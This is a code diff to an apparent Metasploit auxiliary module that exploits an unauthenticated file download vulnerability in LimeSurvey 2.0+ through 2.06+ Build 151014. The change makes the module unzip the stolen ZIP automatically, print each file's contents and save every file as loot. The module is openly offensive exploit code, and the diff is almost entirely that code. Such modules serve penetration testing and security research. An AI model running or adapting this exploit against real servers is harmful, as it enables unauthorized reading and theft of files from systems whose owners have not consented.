@@ -5,6 +5,9 @@
 
 require 'msf/core'
 
+# for extracting files
+require 'zip'
+
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
@@ -16,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
         This module exploits an unauthenticated file download vulnerability
         in limesurvey between 2.0+ and 2.06+ Build 151014. The file is downloaded
-        as a ZIP file and stored compressed.
+        as a ZIP and unzipped automatically so also binary files can be downloaded.
       },
       'Author'         =>
         [
@@ -56,6 +59,21 @@ class Metasploit3 < Msf::Auxiliary
     Rex::Text.encode_base64(serialized)
   end
 
+  def unzip_file(zipfile)
+    begin
+      zip_data = Hash.new
+      Zip::File.open_buffer(zipfile) do |filezip|
+        filezip.each do |entry|
+          zip_data[::File.expand_path(entry.name)] = filezip.read(entry)
+        end
+      end
+      return zip_data
+    rescue Zip::Error => e
+      print_error("Error extracting ZIP: #{e}")
+      return nil
+    end
+  end
+
   def run
     csrf_token = Rex::Text.rand_text_alpha(10)
 
@@ -86,14 +104,21 @@ class Metasploit3 < Msf::Auxiliary
         })
 
         if res and res.code == 200
-          path = store_loot(
-            'limesurvey.http',
-            'application/zip',
-            rhost,
-            res.body,
-            ::File.basename(local_path)
-          )
-          print_good("File saved in: #{path}")
+          unzipped = unzip_file(res.body)
+
+          unzipped.each do |filename, content|
+            print_good("Filename: #{filename}")
+            print_good(content)
+
+            path = store_loot(
+              'limesurvey.http',
+              '',
+              rhost,
+              content,
+              filename
+            )
+            print_good("File saved in: #{path}")
+          end
         else
           print_error('Failed to download file')
         end
